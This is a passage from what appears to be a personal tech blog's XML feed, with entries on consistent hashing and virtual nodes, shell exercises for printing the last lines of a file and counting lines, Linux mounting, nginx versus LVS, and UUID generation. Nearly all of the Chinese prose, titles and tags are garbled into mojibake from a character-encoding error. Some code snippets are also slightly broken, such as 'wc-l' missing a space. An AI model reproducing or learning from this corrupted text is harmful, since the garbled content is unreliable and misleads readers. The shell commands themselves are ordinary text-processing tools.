å´©æºƒï¼Œè¿›è€Œå½¢æˆé›ªå´©å¼çš„è¿é”ååº”ã€‚<br>æ‰€ä»¥ï¼Œ<strong>ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•è™½ç„¶å‡å°‘äº†æ•°æ®è¿ç§»é‡ï¼Œä½†æ˜¯å­˜åœ¨èŠ‚ç‚¹åˆ†å¸ƒä¸å‡åŒ€çš„é—®é¢˜</strong>ã€‚</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h2 id="å¦‚ä½•é€šè¿‡è™šæ‹ŸèŠ‚ç‚¹æé«˜å‡è¡¡åº¦ï¼Ÿ"><a href="#å¦‚ä½•é€šè¿‡è™šæ‹ŸèŠ‚ç‚¹æé«˜å‡è¡¡åº¦ï¼Ÿ" class="headerlink" title="å¦‚ä½•é€šè¿‡è™šæ‹ŸèŠ‚ç‚¹æé«˜å‡è¡¡åº¦ï¼Ÿ"></a><strong>å¦‚ä½•é€šè¿‡è™šæ‹ŸèŠ‚ç‚¹æé«˜å‡è¡¡åº¦ï¼Ÿ</strong></h2><p>è¦æƒ³è§£å†³èŠ‚ç‚¹èƒ½åœ¨å“ˆå¸Œç¯ä¸Šåˆ†é…ä¸å‡åŒ€çš„é—®é¢˜ï¼Œå°±æ˜¯è¦æœ‰å¤§é‡çš„èŠ‚ç‚¹ï¼ŒèŠ‚ç‚¹æ•°è¶Šå¤šï¼Œå“ˆå¸Œç¯ä¸Šçš„èŠ‚ç‚¹åˆ†å¸ƒçš„å°±è¶Šå‡åŒ€ã€‚<br>ä½†é—®é¢˜æ˜¯ï¼Œå®é™…ä¸­æˆ‘ä»¬æ²¡æœ‰é‚£ä¹ˆå¤šèŠ‚ç‚¹ã€‚æ‰€ä»¥è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±åŠ å…¥<strong>è™šæ‹ŸèŠ‚ç‚¹</strong>ï¼Œä¹Ÿå°±æ˜¯å¯¹ä¸€ä¸ªçœŸå®èŠ‚ç‚¹åšå¤šä¸ªå‰¯æœ¬ã€‚<br>å…·ä½“åšæ³•æ˜¯ï¼Œ<strong>ä¸å†å°†çœŸå®èŠ‚ç‚¹æ˜ å°„åˆ°å“ˆå¸Œç¯ä¸Šï¼Œè€Œæ˜¯å°†è™šæ‹ŸèŠ‚ç‚¹æ˜ å°„åˆ°å“ˆå¸Œç¯ä¸Šï¼Œå¹¶å°†è™šæ‹ŸèŠ‚ç‚¹æ˜ å°„åˆ°å®é™…èŠ‚ç‚¹ï¼Œæ‰€ä»¥è¿™é‡Œæœ‰ã€Œä¸¤å±‚ã€æ˜ å°„å…³ç³»ã€‚</strong><br>æ¯”å¦‚å¯¹æ¯ä¸ªèŠ‚ç‚¹åˆ†åˆ«è®¾ç½® 3 ä¸ªè™šæ‹ŸèŠ‚ç‚¹ï¼š</p><ul><li>å¯¹èŠ‚ç‚¹ A åŠ ä¸Šç¼–å·æ¥ä½œä¸ºè™šæ‹ŸèŠ‚ç‚¹ï¼šA-01ã€A-02ã€A-03</li><li>å¯¹èŠ‚ç‚¹ B åŠ ä¸Šç¼–å·æ¥ä½œä¸ºè™šæ‹ŸèŠ‚ç‚¹ï¼šB-01ã€B-02ã€B-03</li><li>å¯¹èŠ‚ç‚¹ C åŠ ä¸Šç¼–å·æ¥ä½œä¸ºè™šæ‹ŸèŠ‚ç‚¹ï¼šC-01ã€C-02ã€C-03</li></ul><p>å¼•å…¥è™šæ‹ŸèŠ‚ç‚¹åï¼ŒåŸæœ¬å“ˆå¸Œç¯ä¸Šåªæœ‰ 3 ä¸ªèŠ‚ç‚¹çš„æƒ…å†µï¼Œå°±ä¼šå˜æˆæœ‰ 9 ä¸ªè™šæ‹ŸèŠ‚ç‚¹æ˜ å°„åˆ°å“ˆå¸Œç¯ä¸Šï¼Œå“ˆå¸Œç¯ä¸Šçš„èŠ‚ç‚¹æ•°é‡å¤šäº† 3 å€ã€‚<br><img src="https://snowgo.top/medias/medias/%E4%BB%80%E4%B9%88%E6%98%AF%E4%B8%80%E8%87%B4%E6%80%A7%E5%93%88%E5%B8%8C/27.png"><br>ä½ å¯ä»¥çœ‹åˆ°ï¼Œ<strong>èŠ‚ç‚¹æ•°é‡å¤šäº†åï¼ŒèŠ‚ç‚¹åœ¨å“ˆå¸Œç¯ä¸Šçš„åˆ†å¸ƒå°±ç›¸å¯¹å‡åŒ€äº†</strong>ã€‚è¿™æ—¶å€™ï¼Œå¦‚æœæœ‰è®¿é—®è¯·æ±‚å¯»å€åˆ°ã€ŒA-01ã€è¿™ä¸ªè™šæ‹ŸèŠ‚ç‚¹ï¼Œæ¥ç€å†é€šè¿‡ã€ŒA-01ã€è™šæ‹ŸèŠ‚ç‚¹æ‰¾åˆ°çœŸå®èŠ‚ç‚¹ Aï¼Œè¿™æ ·è¯·æ±‚å°±èƒ½è®¿é—®åˆ°çœŸå®èŠ‚ç‚¹ A äº†ã€‚<br>ä¸Šé¢ä¸ºäº†æ–¹ä¾¿ä½ ç†è§£ï¼Œæ¯ä¸ªçœŸå®èŠ‚ç‚¹ä»…åŒ…å« 3 ä¸ªè™šæ‹ŸèŠ‚ç‚¹ï¼Œè¿™æ ·èƒ½èµ·åˆ°çš„å‡è¡¡æ•ˆæœå…¶å®å¾ˆæœ‰é™ã€‚è€Œåœ¨å®é™…çš„å·¥ç¨‹ä¸­ï¼Œè™šæ‹ŸèŠ‚ç‚¹çš„æ•°é‡ä¼šå¤§å¾ˆå¤šï¼Œæ¯”å¦‚ Nginx çš„ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•ï¼Œæ¯ä¸ªæƒé‡ä¸º 1 çš„çœŸå®èŠ‚ç‚¹å°±å«æœ‰160 ä¸ªè™šæ‹ŸèŠ‚ç‚¹ã€‚<br>å¦å¤–ï¼Œè™šæ‹ŸèŠ‚ç‚¹é™¤äº†ä¼šæé«˜èŠ‚ç‚¹çš„å‡è¡¡åº¦ï¼Œè¿˜ä¼šæé«˜ç³»ç»Ÿçš„ç¨³å®šæ€§ã€‚<strong>å½“èŠ‚ç‚¹å˜åŒ–æ—¶ï¼Œä¼šæœ‰ä¸åŒçš„èŠ‚ç‚¹å…±åŒåˆ†æ‹…ç³»ç»Ÿçš„å˜åŒ–ï¼Œå› æ­¤ç¨³å®šæ€§æ›´é«˜</strong>ã€‚<br>æ¯”å¦‚ï¼Œå½“æŸä¸ªèŠ‚ç‚¹è¢«ç§»é™¤æ—¶ï¼Œå¯¹åº”è¯¥èŠ‚ç‚¹çš„å¤šä¸ªè™šæ‹ŸèŠ‚ç‚¹å‡ä¼šç§»é™¤ï¼Œè€Œè¿™äº›è™šæ‹ŸèŠ‚ç‚¹æŒ‰é¡ºæ—¶é’ˆæ–¹å‘çš„ä¸‹ä¸€ä¸ªè™šæ‹ŸèŠ‚ç‚¹ï¼Œå¯èƒ½ä¼šå¯¹åº”ä¸åŒçš„çœŸå®èŠ‚ç‚¹ï¼Œå³è¿™äº›ä¸åŒçš„çœŸå®èŠ‚ç‚¹å…±åŒåˆ†æ‹…äº†èŠ‚ç‚¹å˜åŒ–å¯¼è‡´çš„å‹åŠ›ã€‚<br>è€Œä¸”ï¼Œæœ‰äº†è™šæ‹ŸèŠ‚ç‚¹åï¼Œè¿˜å¯ä»¥ä¸ºç¡¬ä»¶é…ç½®æ›´å¥½çš„èŠ‚ç‚¹å¢åŠ æƒé‡ï¼Œæ¯”å¦‚å¯¹æƒé‡æ›´é«˜çš„èŠ‚ç‚¹å¢åŠ æ›´å¤šçš„è™šæ‹ŸæœºèŠ‚ç‚¹å³å¯ã€‚<br>å› æ­¤ï¼Œ<strong>å¸¦è™šæ‹ŸèŠ‚ç‚¹çš„ä¸€è‡´æ€§å“ˆå¸Œæ–¹æ³•ä¸ä»…é€‚åˆç¡¬ä»¶é…ç½®ä¸åŒçš„èŠ‚ç‚¹çš„åœºæ™¯ï¼Œè€Œä¸”é€‚åˆèŠ‚ç‚¹è§„æ¨¡ä¼šå‘ç”Ÿå˜åŒ–çš„åœºæ™¯</strong>ã€‚</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a><strong>æ€»ç»“</strong></h2><p>ä¸åŒçš„è´Ÿè½½å‡è¡¡ç®—æ³•é€‚ç”¨çš„ä¸šåŠ¡åœºæ™¯ä¹Ÿä¸åŒçš„ã€‚<br>è½®è®­è¿™ç±»çš„ç­–ç•¥åªèƒ½é€‚ç”¨ä¸æ¯ä¸ªèŠ‚ç‚¹çš„æ•°æ®éƒ½æ˜¯ç›¸åŒçš„åœºæ™¯ï¼Œè®¿é—®ä»»æ„èŠ‚ç‚¹éƒ½èƒ½è¯·æ±‚åˆ°æ•°æ®ã€‚ä½†æ˜¯ä¸é€‚ç”¨åˆ†å¸ƒå¼ç³»ç»Ÿï¼Œå› ä¸ºåˆ†å¸ƒå¼ç³»ç»Ÿæ„å‘³ç€æ•°æ®æ°´å¹³åˆ‡åˆ†åˆ°äº†ä¸åŒçš„èŠ‚ç‚¹ä¸Šï¼Œè®¿é—®æ•°æ®çš„æ—¶å€™ï¼Œä¸€å®šè¦å¯»å€å­˜å‚¨è¯¥æ•°æ®çš„èŠ‚ç‚¹ã€‚<br>å“ˆå¸Œç®—æ³•è™½ç„¶èƒ½å»ºç«‹æ•°æ®å’ŒèŠ‚ç‚¹çš„æ˜ å°„å…³ç³»ï¼Œä½†æ˜¯æ¯æ¬¡åœ¨èŠ‚ç‚¹æ•°é‡å‘ç”Ÿå˜åŒ–çš„æ—¶å€™ï¼Œæœ€åæƒ…å†µä¸‹æ‰€æœ‰æ•°æ®éƒ½éœ€è¦è¿ç§»ï¼Œè¿™æ ·å¤ªéº»çƒ¦äº†ï¼Œæ‰€ä»¥ä¸é€‚ç”¨èŠ‚ç‚¹æ•°é‡å˜åŒ–çš„åœºæ™¯ã€‚<br>ä¸ºäº†å‡å°‘è¿ç§»çš„æ•°æ®é‡ï¼Œå°±å‡ºç°äº†ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•ã€‚<br>ä¸€è‡´æ€§å“ˆå¸Œæ˜¯æŒ‡å°†ã€Œå­˜å‚¨èŠ‚ç‚¹ã€å’Œã€Œæ•°æ®ã€éƒ½æ˜ å°„åˆ°ä¸€ä¸ªé¦–å°¾ç›¸è¿çš„å“ˆå¸Œç¯ä¸Šï¼Œå¦‚æœå¢åŠ æˆ–è€…ç§»é™¤ä¸€ä¸ªèŠ‚ç‚¹ï¼Œä»…å½±å“è¯¥èŠ‚ç‚¹åœ¨å“ˆå¸Œç¯ä¸Šé¡ºæ—¶é’ˆç›¸é‚»çš„åç»§èŠ‚ç‚¹ï¼Œå…¶å®ƒæ•°æ®ä¹Ÿä¸ä¼šå—åˆ°å½±å“ã€‚<br>ä½†æ˜¯ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•ä¸èƒ½å¤Ÿå‡åŒ€çš„åˆ†å¸ƒèŠ‚ç‚¹ï¼Œä¼šå‡ºç°å¤§é‡è¯·æ±‚éƒ½é›†ä¸­åœ¨ä¸€ä¸ªèŠ‚ç‚¹çš„æƒ…å†µï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹è¿›è¡Œå®¹ç¾ä¸æ‰©å®¹æ—¶ï¼Œå®¹æ˜“å‡ºç°é›ªå´©çš„è¿é”ååº”ã€‚<br>ä¸ºäº†è§£å†³ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•ä¸èƒ½å¤Ÿå‡åŒ€çš„åˆ†å¸ƒèŠ‚ç‚¹çš„é—®é¢˜ï¼Œå°±éœ€è¦å¼•å…¥è™šæ‹ŸèŠ‚ç‚¹ï¼Œå¯¹ä¸€ä¸ªçœŸå®èŠ‚ç‚¹åšå¤šä¸ªå‰¯æœ¬ã€‚ä¸å†å°†çœŸå®èŠ‚ç‚¹æ˜ å°„åˆ°å“ˆå¸Œç¯ä¸Šï¼Œè€Œæ˜¯å°†è™šæ‹ŸèŠ‚ç‚¹æ˜ å°„åˆ°å“ˆå¸Œç¯ä¸Šï¼Œå¹¶å°†è™šæ‹ŸèŠ‚ç‚¹æ˜ å°„åˆ°å®é™…èŠ‚ç‚¹ï¼Œæ‰€ä»¥è¿™é‡Œæœ‰ã€Œä¸¤å±‚ã€æ˜ å°„å…³ç³»ã€‚<br>å¼•å…¥è™šæ‹ŸèŠ‚ç‚¹åï¼Œå¯ä»¥ä¼šæé«˜èŠ‚ç‚¹çš„å‡è¡¡åº¦ï¼Œè¿˜ä¼šæé«˜ç³»ç»Ÿçš„ç¨³å®šæ€§ã€‚æ‰€ä»¥ï¼Œå¸¦è™šæ‹ŸèŠ‚ç‚¹çš„ä¸€è‡´æ€§å“ˆå¸Œæ–¹æ³•ä¸ä»…é€‚åˆç¡¬ä»¶é…ç½®ä¸åŒçš„èŠ‚ç‚¹çš„åœºæ™¯ï¼Œè€Œä¸”é€‚åˆèŠ‚ç‚¹è§„æ¨¡ä¼šå‘ç”Ÿå˜åŒ–çš„åœºæ™¯ã€‚<br>å®Œï¼</p>]]></content>
      
      
      <categories>
          
          <category> é—®é¢˜å’ŒæŠ€å·§ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è´Ÿè½½å‡è¡¡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shellç³»åˆ—é¢˜ä¹‹æ‰“å°æ–‡ä»¶çš„æœ€å5è¡Œ</title>
      <link href="/2022/04/03/shell%E7%B3%BB%E5%88%97%E9%A2%98%E4%B9%8B%E6%89%93%E5%8D%B0%E6%96%87%E4%BB%B6%E7%9A%84%E6%9C%80%E5%90%8E5%E8%A1%8C/"/>
      <url>/2022/04/03/shell%E7%B3%BB%E5%88%97%E9%A2%98%E4%B9%8B%E6%89%93%E5%8D%B0%E6%96%87%E4%BB%B6%E7%9A%84%E6%9C%80%E5%90%8E5%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h2 id="æè¿°"><a href="#æè¿°" class="headerlink" title="æè¿°"></a>æè¿°</h2><p>ç»å¸¸æŸ¥çœ‹æ—¥å¿—çš„æ—¶å€™ï¼Œä¼šä»æ–‡ä»¶çš„æœ«å°¾å¾€å‰æŸ¥çœ‹ï¼Œäºæ˜¯è¯·ä½ å†™ä¸€ä¸ª bashè„šæœ¬ä»¥è¾“å‡ºä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ nowcoder.txtä¸­çš„æœ€å5è¡Œ<br>ç¤ºä¾‹:<br>å‡è®¾ nowcoder.txt å†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include&lt;iostream&gt;</span></span><br><span class="line">using namespace std;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int a = 10;</span><br><span class="line">int b = 100;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;a + b:&quot;</span> &lt;&lt; a + b &lt;&lt; endl;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½ çš„è„šæœ¬åº”å½“è¾“å‡ºï¼š</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">int a = 10;</span><br><span class="line">int b = 100;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;a + b:&quot;</span> &lt;&lt; a + b &lt;&lt; endl;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p>æŸ¥çœ‹æ–‡ä»¶çš„å‰5è¡Œï¼Œå¯ä»¥ä½¿ç”¨headå‘½ä»¤ï¼Œå¦‚<br><code>head -5 filename</code><br>æŸ¥çœ‹æ–‡ä»¶çš„å5è¡Œï¼Œå¯ä»¥ä½¿ç”¨tailå‘½ä»¤ï¼Œå¦‚ï¼š<br><code>tail -5 filename æˆ– tail -n 5 filename</code><br>æŸ¥çœ‹æ–‡ä»¶ä¸­é—´ä¸€æ®µï¼Œä½ å¯ä»¥ä½¿ç”¨sedå‘½ä»¤ï¼Œå¦‚ï¼š<br><code>sed -n â€˜5,20pâ€™ filename</code><br>è¿™æ ·ä½ å°±å¯ä»¥åªæŸ¥çœ‹æ–‡ä»¶çš„ç¬¬5è¡Œåˆ°ç¬¬20è¡Œã€‚</p>]]></content>
      
      
      <categories>
          
          <category> é—®é¢˜å’ŒæŠ€å·§ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LinuxæŒ‚è½½æ˜¯ä»€ä¹ˆæ„æ€</title>
      <link href="/2022/04/02/Linux%E6%8C%82%E8%BD%BD%E6%98%AF%E4%BB%80%E4%B9%88%E6%84%8F%E6%80%9D/"/>
      <url>/2022/04/02/Linux%E6%8C%82%E8%BD%BD%E6%98%AF%E4%BB%80%E4%B9%88%E6%84%8F%E6%80%9D/</url>
      
        <content type="html"><![CDATA[<p>æŒ‚è½½å°±æ˜¯å°†æŸä¸ªæœªä½¿ç”¨çš„ç©ºé—´æˆ–å¯ç§»åŠ¨è®¾å¤‡çš„å­˜å‚¨ç©ºé—´æŒ‡å‘ä¸€ä¸ªç›®å½•ï¼Œè¿™æ ·ï¼Œé€šè¿‡è¯¥ç›®å½•å°±å¯ä»¥è®¿é—®ä½ çš„ç©ºé—´äº†ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> é—®é¢˜å’ŒæŠ€å·§ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nginxä¸lvsçš„åŒºåˆ«</title>
      <link href="/2022/04/02/nginx%E4%B8%8Elvs%E7%9A%84%E5%8C%BA%E5%88%AB/"/>
      <url>/2022/04/02/nginx%E4%B8%8Elvs%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
      
        <content type="html"><![CDATA[<blockquote><p> lvså’Œnginxéƒ½å¯ä»¥ç”¨ä½œå¤šæœºè´Ÿè½½æ–¹æ¡ˆï¼Œä»–ä»¬å„æœ‰ä¼˜ç¼ºç‚¹ï¼Œåœ¨ç”Ÿäº§ç¯å¢ƒä¸­éœ€è¦å¥½å¥½åˆ†æå®é™…æƒ…å†µå¹¶åŠ ä»¥åˆ©ç”¨ã€‚</p></blockquote><ol><li>nginxå·¥ä½œåœ¨ç½‘ç»œçš„ç¬¬7å±‚ï¼Œæ‰€ä»¥å®ƒå¯ä»¥é’ˆå¯¹httpåº”ç”¨æœ¬èº«æ¥åšåˆ†æµç­–ç•¥ï¼Œæ¯”å¦‚é’ˆå¯¹åŸŸåã€ç›®å½•ç»“æ„ç­‰ï¼Œç›¸æ¯”ä¹‹ä¸‹lvså¹¶ä¸å…·å¤‡è¿™æ ·çš„åŠŸèƒ½ï¼Œå› ä¸ºlvså·¥ä½œåœ¨ç¬¬4å±‚ï¼Œä½†æ˜¯ä»–å·¥ä½œçš„èŒƒå›´æ›´å¹¿ä¸€äº›ã€‚</li><li>nginxå¯ä»¥æ£€æµ‹åˆ°æœåŠ¡å™¨å†…éƒ¨çš„æ•…éšœï¼Œæ¯”å¦‚æ ¹æ®æœåŠ¡å™¨å¤„ç†ç½‘é¡µè¿”å›çš„çŠ¶æ€ç ã€è¶…æ—¶ç­‰ç­‰ï¼Œå¹¶ä¸”ä¼šæŠŠè¿”å›é”™è¯¯çš„è¯·æ±‚é‡æ–°æäº¤åˆ°å¦ä¸€ä¸ªèŠ‚ç‚¹ã€‚ç›®å‰lvsä¸­ldirectdä¹Ÿèƒ½æ”¯æŒé’ˆå¯¹æœåŠ¡å™¨å†…éƒ¨çš„æƒ…å†µæ¥ç›‘æ§ï¼Œä½†lvsçš„åŸç†ä½¿å…¶ä¸èƒ½é‡å‘è¯·æ±‚ã€‚<strong>é‡å‘è¯·æ±‚</strong>è¿™ç‚¹ï¼Œæ¯”å¦‚ç”¨æˆ·æ­£åœ¨ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ï¼Œè€Œå¤„ç†è¯¥ä¸Šä¼ çš„èŠ‚ç‚¹åˆšå¥½åœ¨ä¸Šä¼ è¿‡ç¨‹ä¸­å‡ºç°æ•…éšœï¼Œnginxä¼šæŠŠä¸Šä¼ åˆ‡åˆ°å¦ä¸€å°æœåŠ¡å™¨é‡æ–°å¤„ç†ï¼Œè€Œlvså°±ç›´æ¥æ–­æ‰äº†ï¼Œå¦‚æœæ˜¯ä¸Šä¼ ä¸€ä¸ªå¾ˆå¤§çš„æ–‡ä»¶æˆ–è€…å¾ˆé‡è¦çš„æ–‡ä»¶çš„è¯ï¼Œç”¨æˆ·å¯èƒ½ä¼šå› æ­¤è€Œæ¼ç«ã€‚</li></ol>]]></content>
      
      
      <categories>
          
          <category> é—®é¢˜å’ŒæŠ€å·§ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shellç³»åˆ—é¢˜ä¹‹ç»Ÿè®¡æ–‡ä»¶çš„è¡Œæ•°</title>
      <link href="/2022/04/02/shell%E7%B3%BB%E5%88%97%E9%A2%98%E4%B9%8B%E7%BB%9F%E8%AE%A1%E6%96%87%E4%BB%B6%E7%9A%84%E8%A1%8C%E6%95%B0/"/>
      <url>/2022/04/02/shell%E7%B3%BB%E5%88%97%E9%A2%98%E4%B9%8B%E7%BB%9F%E8%AE%A1%E6%96%87%E4%BB%B6%E7%9A%84%E8%A1%8C%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="æè¿°"><a href="#æè¿°" class="headerlink" title="æè¿°"></a>æè¿°</h2><p>å†™ä¸€ä¸ª bashè„šæœ¬ä»¥è¾“å‡ºä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ nowcoder.txtä¸­çš„è¡Œæ•°<br>ç¤ºä¾‹:<br>å‡è®¾ nowcoder.txt å†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;iostream&gt;</span></span><br><span class="line">using namespace std;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int a = 10;</span><br><span class="line">    int b = 100;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;a + b:&quot;</span> &lt;&lt; a + b &lt;&lt; endl;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä½ çš„è„šæœ¬åº”å½“è¾“å‡ºï¼š<br>9</p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><h3 id="æ–¹æ³•ï¼ˆ1ï¼‰"><a href="#æ–¹æ³•ï¼ˆ1ï¼‰" class="headerlink" title="æ–¹æ³•ï¼ˆ1ï¼‰"></a>æ–¹æ³•ï¼ˆ1ï¼‰</h3><ul><li> wc -[clw]åˆ†åˆ«ä»£è¡¨å­—èŠ‚æ•°ï¼Œè¡Œæ•°ï¼Œå­—æ•°</li></ul><p>wc -l æ˜¯ç”¨æ¥æŸ¥çœ‹æ–‡ä»¶çš„newlineçš„æ•°é‡çš„ã€‚<br>åœ¨linuxç³»ç»Ÿä¸­ï¼Œnewlineå­—ç¬¦å°±æ˜¯ \n å­—ç¬¦ã€‚<br><code>wc -l ./nowcoder.txt</code><br>8 ./nowcoder.txt<br>è¾“å‡ºä¸­åŒ…å«äº†æ–‡ä»¶åï¼Œå› æ­¤å†åšä¸€ä¸‹å¤„ç†ï¼š<br><code>wc-l ./nowcoder.txt | awk&#39;&#123;print $1&#125;&#39;</code></p><h3 id="æ–¹æ³•ï¼ˆ2ï¼‰"><a href="#æ–¹æ³•ï¼ˆ2ï¼‰" class="headerlink" title="æ–¹æ³•ï¼ˆ2ï¼‰"></a>æ–¹æ³•ï¼ˆ2ï¼‰</h3><ul><li><a href="https://www.runoob.com/linux/linux-comm-awk.html">https://www.runoob.com/linux/linux-comm-awk.html</a></li></ul><p><code>#!/bin/bash</code><br><code>awk &#39;&#123;print NR&#125;&#39; ./nowcoder.txt |tail -n 1</code><br>awk å¯ä»¥æ‰“å°æ‰€æœ‰è¡Œçš„è¡Œå·<br><code>awk &#39;&#123;print NR&#125;&#39; ./nowcoder.txt</code><br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>è¯¥è¾“å‡ºçš„æœ€åä¸€è¡Œå°±æ˜¯æ–‡ä»¶çš„è¡Œæ•°ï¼Œç»“åˆ tail å°±å¯ä»¥è·å–åˆ°æ–‡ä»¶çš„è¡Œæ•°<br><code>awk &#39;&#123;print NR&#125;&#39; ./nowcoder.txt |tail -n 1</code><br>8</p><h3 id="æ–¹æ³•ï¼ˆ3ï¼‰"><a href="#æ–¹æ³•ï¼ˆ3ï¼‰" class="headerlink" title="æ–¹æ³•ï¼ˆ3ï¼‰"></a>æ–¹æ³•ï¼ˆ3ï¼‰</h3><ul><li><a href="https://www.runoob.com/linux/linux-comm-awk.html">https://www.runoob.com/linux/linux-comm-awk.html</a></li></ul><p>awk æœ¬èº«å°±å¯ä»¥åªæ‰“å°æœ€åä¸€è¡Œï¼Œå› æ­¤ä¸€ä¸ª awk è„šæœ¬ä¹Ÿå¯ä»¥æå®š<br><code>awk &#39;END&#123;print NR&#125;&#39; ./nowcoder.txt</code></p><h3 id="æ–¹æ³•ï¼ˆ4ï¼‰"><a href="#æ–¹æ³•ï¼ˆ4ï¼‰" class="headerlink" title="æ–¹æ³•ï¼ˆ4ï¼‰"></a>æ–¹æ³•ï¼ˆ4ï¼‰</h3><ul><li><a href="https://www.runoob.com/linux/linux-comm-grep.html">https://www.runoob.com/linux/linux-comm-grep.html</a></li></ul><p>ä½¿ç”¨ grep æœç´¢ â€œâ€ï¼Œç„¶ååˆ©ç”¨ grep è‡ªå¸¦çš„åŠŸèƒ½ç»Ÿè®¡è¡Œ<br><code>grep -c &quot;&quot; ./nowcoder.txt </code><br>æˆ–<br><code>grep -n &quot;&quot; ./nowcoder.txt  | awk -F &quot;:&quot; &#39;&#123;print $1 &#125;&#39; | tail -n 1</code></p><h3 id="æ–¹æ³•ï¼ˆ5ï¼‰"><a href="#æ–¹æ³•ï¼ˆ5ï¼‰" class="headerlink" title="æ–¹æ³•ï¼ˆ5ï¼‰"></a>æ–¹æ³•ï¼ˆ5ï¼‰</h3><p>sed ç»Ÿè®¡è¡Œ<br><code>sed -n &#39;$=&#39; ./nowcoder.txt</code></p>]]></content>
      
      
      <categories>
          
          <category> é—®é¢˜å’ŒæŠ€å·§ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>UUIDï¼šå¦‚ä½•é«˜æ•ˆç”Ÿæˆå…¨å±€çš„å”¯ä¸€IDï¼Ÿ</title>
      <link href="/2022/03/29/UUID%EF%BC%9A%E5%A6%82%E4%BD%95%E9%AB%98%E6%95%88%E7%94%9F%E6%88%90%E5%85%A8%E5%B1%80%E7%9A%84%E5%94%AF%E4%B8%80ID%EF%BC%9F/"/>
      <url>/2022/03/29/UUID%EF%BC%9A%E5%A6%82%E4%BD%95%E9%AB%98%E6%95%88%E7%94%9F%E6%88%90%E5%85%A8%E5%B1%80%E7%9A%84%E5%94%AF%E4%B8%80ID%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<h2 id="å•ç‚¹ç”Ÿæˆå™¨"><a href="#å•ç‚¹ç”Ÿæˆå™¨" class="headerlink" title="å•ç‚¹ç”Ÿæˆå™¨"></a>å•ç‚¹ç”Ÿæˆå™¨</h2><p><strong>ç›´æ¥åœ¨å†…å­˜ä¸­è‡ªå¢ï¼Œç¼ºç‚¹æ˜¯å†…å­˜å´©äº†å…¨æ²¡äº†ã€‚</strong></p><h2 id="è¿œç¨‹è°ƒç”¨æ•°æ®åº“"><a href="#è¿œç¨‹è°ƒç”¨æ•°æ®åº“" class="headerlink" title="è¿œç¨‹è°ƒç”¨æ•°æ®åº“"></a>è¿œç¨‹è°ƒç”¨æ•°æ®åº“</h2><p><strong>é…ç½®è¶³å¤Ÿå¤šçš„æ•°æ®åº“ï¼Œæ¯ä¸ªè´Ÿè´£ç»´æŠ¤ä¸åŒçš„idæ®µï¼Œä¸šåŠ¡è¿™è¾¹æ¯æ¬¡è¯·æ±‚ä¸€æ‰¹idæ”¾åˆ°å†…å­˜ï¼Œç”¨å®Œäº†å†ç»§ç»­æ‰¾æ•°æ®åº“è¦ã€‚</strong></p><h2 id="UUID"><a href="#UUID" class="headerlink" title="UUID"></a>UUID</h2><p>å¯ä»¥ç¿»è¯‘æˆå…¨å±€å”¯ä¸€IDï¼Œå’Œå‰é¢æˆ‘ä»¬æ€è€ƒçš„ä¸¤ç§æ–¹æ¡ˆä¸åŒï¼Œè¿™æ¬¡çš„1Dä¸å†éœ€è¦é€šè¿‡è¿œç¨‹è°ƒç”¨ä¸€ä¸ªç‹¬ç«‹çš„æœåŠ¡äº§ç”Ÿï¼Œè€Œ 